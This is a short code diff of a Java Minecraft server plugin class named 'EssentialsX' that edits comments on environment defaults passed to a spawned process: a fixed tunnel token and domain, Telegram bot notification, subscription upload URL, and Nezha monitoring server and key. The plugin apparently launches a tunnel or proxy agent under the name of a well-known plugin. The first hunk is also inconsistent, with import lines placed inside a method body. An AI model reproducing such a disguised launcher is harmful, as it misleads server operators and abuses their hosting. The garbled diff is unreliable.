@@ -69,12 +69,12 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         
         // Set default values
-        env.put("TOK", "");  //固定隧道token
-        env.put("ARGO_DOMAIN", "");  //固定隧道域名
-        env.put("TG", "");  //TG通知，格式: "CHAT_ID BOT_TOKEN"
-        env.put("SUB_URL", "");  //订阅上传地址
-        env.put("NEZHA_SERVER", ""); //哪吒服务器
-        env.put("NEZHA_KEY", "");  //哪吒密钥
+        env.put("TOK", "");  
+        env.put("ARGO_DOMAIN", ""); 
+        env.put("TG", "");  
+        env.put("SUB_URL", ""); 
+        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_KEY", ""); 
 
 import org.bukkit.plugin.java.JavaPlugin;
 import java.io.*;
@@ -144,7 +144,7 @@ public class EssentialsX extends JavaPlugin {
         // Set environment variables
         Map<String, String> env = pb.environment();
         
-        // Set default values
+        // 只需修改这里的参数即可，没有的留空
         env.put("TOK", ""); //固定隧道token
         env.put("ARGO_DOMAIN", "");//固定隧道域名
         env.put("TG", "");//TG通知，格式: "CHAT_ID BOT_TOKEN"
